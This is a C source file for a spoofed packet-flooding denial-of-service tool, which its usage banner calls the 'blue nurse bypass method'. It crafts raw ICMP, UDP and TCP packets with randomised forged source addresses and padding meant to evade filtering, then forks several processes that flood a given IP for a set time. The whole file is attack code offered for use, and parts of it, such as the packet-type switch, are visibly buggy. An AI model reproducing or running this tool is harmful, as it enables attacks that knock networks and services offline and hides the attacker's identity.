#include <time.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <sys/socket.h>
#include <netinet/ip.h>
int ports[] = {
        7, 22, 53, 69, 80, 143, 152, 161, 443, 8080 
};
char *strings[] = {
    "\x5c\x78\x38\x66\x5c\x72\x5c\x6e",
    "\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x21",
    "\x47\x45\x54\x20\x2f\x20\x48\x54\x54\x50\x2f\x31\x2e\x31",
    "\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x3a\x20\x63\x6c\x6f\x73\x65",
    "\x55\x44\x50\x2d\x43\x48\x45\x43\x4b\x2d\x49\x50\x50\x52\x4f\x54\x4f\x5f\x55\x44\x50",
    "\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x57\x67\x65\x74\x2f\x31\x2e\x31\x34\x2e\x31"
};
char *rand_strs[] = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", 
"r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", 
"M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "1", "2", "3", "4", "5", "6", "7", 
"8", "9", "0", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "п", "ь", "и", "ക", "ച", "ദി", "ല"};
in_addr_t util_local_addr()
{
    int fd = 0;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    if((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("8.8.8.8");
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);

    return addr.sin_addr.s_addr;
}
char *rand_host() {
    char *host = malloc(16);
    sprintf(host, "%d.%d.%d.%d", rand() % 256, rand() % 256, rand() % 256, rand() % 256);
    return host;
}
uint16_t checksum_generic(uint16_t *addr, uint32_t count)
{
    register unsigned long sum = 0;

    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}
unsigned short csum (unsigned short *buf, int count)
{
        register unsigned long sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (unsigned short)(~sum);
}
unsigned short in_cksum(unsigned short* addr, int len)
{
   register int sum = 0;
   u_short answer = 0;
   register u_short* w = addr;
   register int nleft;
   /*
   * Our algorithm is simple, using a 32 bit accumulator (sum), we add
   * sequential 16 bit words to it, and at the end, fold back all the
   * carry bits from the top 16 bits into the lower 16 bits.
   */
   for(nleft = len; nleft > 1; nleft -= 2)
   {
      sum += *w++;
   }
   /* mop up an odd byte, if necessary */
   if(nleft == 1)
   {
      *(u_char*) (&answer) = *(u_char*) w;
      sum += answer;
   }
   /* add back carry outs from top 16 bits to low 16 bits */
   sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
   sum += (sum >> 16); /* add carry */
   answer = ~sum; /* truncate to 16 bits */
   return answer;
}
unsigned short udpcsum(struct iphdr *iph, struct udphdr *udph) {
    struct udp_pseudo
    {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    pseudohead.src_addr=iph->saddr;
    pseudohead.dst_addr=iph->daddr;
    pseudohead.zero=0;
    pseudohead.proto=IPPROTO_UDP;
    pseudohead.length=htons(sizeof(struct udphdr));
    int totaltudp_len = sizeof(struct udp_pseudo) + sizeof(struct udphdr);
    unsigned short *udp = malloc(totaltudp_len);
    memcpy((unsigned char *)udp,&pseudohead,sizeof(struct udp_pseudo));
    memcpy((unsigned char *)udp+sizeof(struct udp_pseudo),(unsigned char *)udph,sizeof(struct udphdr));
    unsigned short output = csum(udp,totaltudp_len);
    free(udp);
    return output;
}
uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    
    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}
void init_ip_headers(struct iphdr *iph, char *rdbuf, char *dhost, int spoof, int protocol) {
    char *shost;
    if(spoof == 1) {
        shost = rand_host();
        iph->saddr = inet_addr(shost);
        free(shost);
    }
    else {
        iph->saddr = util_local_addr();
    }
    iph->daddr = inet_addr(dhost);
    iph->ttl = 64;
    iph->version = 4;
    iph->protocol = protocol;
    iph->ihl = 5;
    iph->id = rand();
    iph->tot_len = sizeof(rdbuf) + sizeof(struct iphdr) + sizeof(struct udphdr);
    iph->check = 0;
    iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

}
void init_tcp_headers(struct iphdr *iph, struct tcphdr *tcph, int dport, int syn, int ack, int fin, int rst, int urg, int psh) {
    tcph->source = htons(rand() % 65536);
    tcph->dest = htons(dport);
    tcph->doff = 5;
    tcph->fin = fin;
    tcph->syn = syn;
    tcph->rst = rst;
    tcph->psh = psh;
    tcph->ack = ack;
    tcph->urg = urg;
    tcph->window = htons(rand() % 0xffff);
    tcph->check = 0;
    tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

}
void init_udp_headers(struct udphdr *udph, int dport, int psize) {
    udph->len = psize;
    udph->source = htons(rand() % 65536);
    udph->dest = htons(dport);
    udph->check = 0;
}
void init_icmp_headers(struct icmphdr *icmph) {
    icmph->un.echo.sequence = rand();
    icmph->un.echo.id = rand();
    icmph->type = ICMP_ECHO;
    icmph->code = 0;
    icmph->checksum = 0;
    icmph->checksum = in_cksum((unsigned short *)icmph, sizeof(struct icmphdr));
}
char **str_split(char *buffer, char *delim, size_t *count)
{
    char **retargs, *token;
    retargs = malloc(1 * sizeof(char *));
    token = strtok_r(buffer, delim, &buffer);
    while (token)
    {
        retargs = realloc(retargs, (*count + 1) * sizeof(char *));
        retargs[(*count)++] = token;
        token = strtok_r(NULL, delim, &buffer);
    }
    return retargs;
}

int verify_ip(char *ip)
{
    size_t argc = 0;
    char **args = str_split(ip, ".", &argc);

    if (argc == 4)
    {
        if (atoi(args[0]) < 256 && atoi(args[1]) < 256 && atoi(args[2]) < 256 && atoi(args[3]) < 256)
        {
            free(args);
            return 1;
        }
    }

    free(args);
    return 0;
}
char *rand_str(int size) {
    int i = 0;
    char *string = malloc((size * 2) + 1);

    while(i < size) {
        if(i == 0) {
            sprintf(string, "%s", rand_strs[rand() % sizeof(rand_strs)/sizeof(rand_strs[0])]);
        } else {
            sprintf(string, "%s%s", string, rand_strs[rand() % sizeof(rand_strs)/sizeof(rand_strs[0])]);
        }
        i++;
    }
    return string;
}
char *str_gen() {
    char *string = malloc(512);
    char *random = rand_str(rand() % 30);
    sprintf(string, "%s", strings[rand() % sizeof(strings)/sizeof(strings[0])]);
    sprintf(string, "%s%s", string, random);
    free(random);
    return string;
}
void blue_nurse_flood(char *host, int seconds, int psize, int spoof) {
    srand(time(NULL) ^ getpid());
    
    char rdbuf[500];
    int port = rand() % sizeof(ports)/sizeof(ports[0]), start = time(NULL), icmp, tcp, sock, udp;

    psize = psize + rand() % 513;

    struct sockaddr_in addr;
    struct iphdr *iph = (struct iphdr *)rdbuf;

    switch (port) {
        case 7:
            icmp = 1;
        case 22:
            tcp = 1;
        case 80:
            tcp = 1;
        case 443:
            tcp = 1;
        default:
            udp = 1, icmp = 0, tcp = 0;
    }

    if(icmp) {
        char *string = str_gen();

        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        struct icmphdr *icmph = (struct icmphdr *) (rdbuf + sizeof(struct iphdr));

        init_ip_headers(iph, rdbuf, host, 1, IPPROTO_ICMP);
        init_icmp_headers(icmph);

        memcpy((void *)icmph + sizeof(struct icmphdr), string, strlen(string));
        free(string);
    } else if(udp) {
        char *string = str_gen();

        sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        struct udphdr *udph = (struct udphdr *) (rdbuf + sizeof(struct iphdr));

        init_ip_headers(iph, rdbuf, host, 1, IPPROTO_UDP);
        init_udp_headers(udph, port, sizeof(string) - 1 + sizeof(struct iphdr) + sizeof(struct udphdr));
        udph->check = udpcsum(iph, udph);

        memcpy((void *)udph + sizeof(struct udphdr), string, strlen(string));
        free(string);
    } else if(tcp) {
        char *string = str_gen();

        sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        struct tcphdr *tcph = (struct tcphdr *) (rdbuf + sizeof(struct udphdr));

        init_ip_headers(iph, rdbuf, host, 1, IPPROTO_TCP);
        init_tcp_headers(iph, tcph, port, rand() % 2, rand() % 2, rand() % 2, rand() % 2, rand() % 2, rand() % 2);

        memcpy((void *)tcph + sizeof(struct tcphdr), string, strlen(string));
        free(string);
    }

    addr.sin_addr.s_addr = inet_addr(host);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;

    while(time(NULL) < start + seconds) {
        sendto(sock, rdbuf, psize, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
    }
    close(sock);
}
int main(int argc, char **argv) {
    if(argc != 5) {
        printf("Welcome to blue nurse bypass method coded by urmommy\r\nUsage: %s [host] [time] [psize] [forks]\r\nNote there is a random psize between 0 and 512 added onto the psize you give to prevent getting filtered\r\nProtocols used in the method: icmp, tcp, udp\r\nMethod is spoofed by defualt\r\n", argv[0]);
        return -1;
    }
    signal(SIGCHLD, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);
    char host[strlen(argv[1]) + 1];
    sprintf(host, "%s", argv[1]);
    if(!verify_ip(host)) {
        printf("Invalid ip address: %s\r\n", argv[1]);
        return -1;
    }
    for(int i = 0; i < atoi(argv[4]); i++) {
        if(!fork()) {
            blue_nurse_flood(argv[1], atoi(argv[2]), atoi(argv[3]), 1);
            _exit(0);
        }
    }
    printf("[main] forks initiated bypassing: %s\r\n", argv[1]);
}
